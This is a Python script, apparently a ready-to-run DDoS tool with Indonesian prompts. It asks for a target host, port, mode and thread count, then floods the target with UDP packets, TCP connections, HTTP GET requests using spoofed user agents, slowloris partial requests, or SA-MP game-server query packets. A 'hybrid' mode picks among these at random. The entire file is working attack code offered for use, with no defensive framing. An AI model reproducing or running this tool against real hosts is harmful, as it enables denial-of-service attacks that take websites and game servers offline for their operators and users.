import socket
import threading
import random
import time
import sys
import requests
from urllib.parse import urlparse

# ----------- CONFIG -----------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 Chrome/90.0.4430.210 Mobile Safari/537.36",
] * 50

# ----------- ASCII BANNER -----------
def banner():
    print(r"""
██████╗  █████╗  ██████╗ ███████╗███████╗    ██████╗ ███████╗██╗██████╗ 
██╔══██╗██╔══██╗██╔════╝ ██╔════╝██╔════╝    ██╔══██╗██╔════╝██║██╔══██╗
██████╔╝███████║██║  ███╗█████╗  █████╗      ██████╔╝█████╗  ██║██████╔╝
██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██╔══╝      ██╔═══╝ ██╔══╝  ██║██╔═══╝ 
██║     ██║  ██║╚██████╔╝███████╗███████╗    ██║     ███████╗██║██║     
╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝    ╚═╝     ╚══════╝╚═╝╚═╝     
    """)
    print("== HYBRID - DDOS ==")
    print()

# ----------- OUTPUT LOG -----------
def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}")

# ----------- ATTACK METHODS -----------

def udp_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while True:
        try:
            sock.sendto(data, (target_ip, target_port))
            log(f"UDP packet sent to {target_ip}:{target_port}")
        except Exception:
            pass

def tcp_flood(target_ip, target_port):
    data = random._urandom(2048)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.send(data)
            sock.close()
            log(f"TCP packet sent to {target_ip}:{target_port}")
        except Exception:
            pass

def http_flood(target_url):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "*/*",
                "Connection": "keep-alive",
                "Referer": f"https://{urlparse(target_url).netloc}/?{random.randint(0,9999)}"
            }
            r = requests.get(target_url, headers=headers, timeout=3)
            log(f"HTTP GET sent to {target_url} | Status: {r.status_code}")
        except Exception:
            pass

def slowloris(target_ip, target_port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target_ip, target_port))
            sock.send(f"GET /?{random.randint(1,1000)} HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
            for _ in range(20):
                sock.send(b"X-a: b\r\n")
                time.sleep(10)
            log(f"Slowloris sent to {target_ip}:{target_port}")
        except Exception:
            pass

def samp_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'\x53\x41\x4d\x50\x00\x21\x00\x00\x00\x01\x02'
    while True:
        try:
            sock.sendto(payload, (target_ip, target_port))
            log(f"SA-MP packet sent to {target_ip}:{target_port}")
        except Exception:
            pass

# ----------- HYBRID MODE -----------

def hybrid_mode(target_ip, target_port, target_url):
    methods = [
        lambda: udp_flood(target_ip, target_port),
        lambda: tcp_flood(target_ip, target_port),
        lambda: http_flood(target_url),
        lambda: slowloris(target_ip, target_port),
        lambda: samp_flood(target_ip, target_port)
    ]
    while True:
        method = random.choice(methods)
        method()

# ----------- MAIN -----------

def main():
    banner()
    target_ip = input("Target IP/Domain: ").strip()
    target_port = int(input("Target Port: "))
    target_url = f"http://{target_ip}:{target_port}/"
    mode = input("Mode (udp/tcp/http/slowloris/samp/hybrid): ").strip().lower()
    threads = int(input("Jumlah Threads: "))

    log(f"Memulai serangan mode {mode} ke {target_ip}:{target_port} dengan {threads} threads")

    for i in range(threads):
        if mode == "udp":
            t = threading.Thread(target=udp_flood, args=(target_ip, target_port))
        elif mode == "tcp":
            t = threading.Thread(target=tcp_flood, args=(target_ip, target_port))
        elif mode == "http":
            t = threading.Thread(target=http_flood, args=(target_url,))
        elif mode == "slowloris":
            t = threading.Thread(target=slowloris, args=(target_ip, target_port))
        elif mode == "samp":
            t = threading.Thread(target=samp_flood, args=(target_ip, target_port))
        elif mode == "hybrid":
            t = threading.Thread(target=hybrid_mode, args=(target_ip, target_port, target_url))
        else:
            log("Mode tidak valid! Pilih dari udp/tcp/http/slowloris/samp/hybrid")
            sys.exit(1)
        t.daemon = True
        t.start()

    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
